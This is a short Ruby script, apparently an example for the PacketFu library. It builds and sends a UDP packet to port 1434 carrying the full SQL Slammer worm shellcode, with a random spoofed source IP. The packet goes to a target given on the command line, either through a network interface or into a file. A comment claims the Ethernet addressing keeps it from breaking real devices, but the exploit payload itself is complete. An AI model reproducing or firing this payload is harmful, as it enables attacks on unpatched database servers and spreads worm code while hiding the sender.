#!/usr/bin/env ruby
# -*- coding: binary -*-

# Fires off a slammer packet to an unsuspecting target. This code does not
# break real devices! (To do that, you'll need to fix up the targetting)
target = ARGV[0]
raise RuntimeError, "Need a target" unless target
action = ARGV[1]
raise RuntimeError, "Need an action. Try file or your interface." unless action

# Path setting slight of hand:
$: << File.expand_path("../../lib", __FILE__)
require 'packetfu'
include PacketFu

slammer = "\004\001\001\001\001\001\001" + "\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001" + "\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001" + "\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001" + "\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\001\334\311\260B\353\016" + "\001\001\001\001\001\001\001p\256B\001p\256B\220\220\220\220\220\220\220\220h\334\311\260B\270\001\001" + "\001\0011\311\261\030P\342\3755\001\001\001\005P\211\345Qh.dllhel32hkernQhounthickChGetTf" + "\271llQh32.dhws2_f\271etQhsockf\271toQhsend\276\030\020\256B\215E\324P\377\026P\215E\340P\215E\360P\377" + "\026P\276\020\020\256B\213\036\213\003=U\213\354Qt\005\276\034\020\256B\377\026\377\3201\311QQP\201\361" + "\003\001\004\233\201\361\001\001\001\001Q\215E\314P\213E\300P\377\026j\021j\002j\002\377\320P\215E\304P" + "\213E\300P\377\026\211\306\t\333\201\363<a\331\377\213E\264\215\f@\215\024\210\301\342\004\001\302\301" + "\342\b)\302\215\004\220\001\330\211E\264j\020\215E\260P1\311Qf\201\361x\001Q\215E\003P\213E\254P\377\326" + "\353\312"

def rand_source_ip
  [rand(0xffffffff)].pack("N")
end

kill_packet = UDPPacket.new
kill_packet.eth_daddr = "00:1b:63:aa:bb:cc"
kill_packet.ip_daddr =  ARGV[0]
kill_packet.ip_src.read(rand_source_ip)
kill_packet.udp_dst = 1434
kill_packet.recalc
kill_packet.payload = slammer

if action == 'file'.downcase
  puts kill_packet.to_f
else
  puts kill_packet.to_w(action.downcase)
end
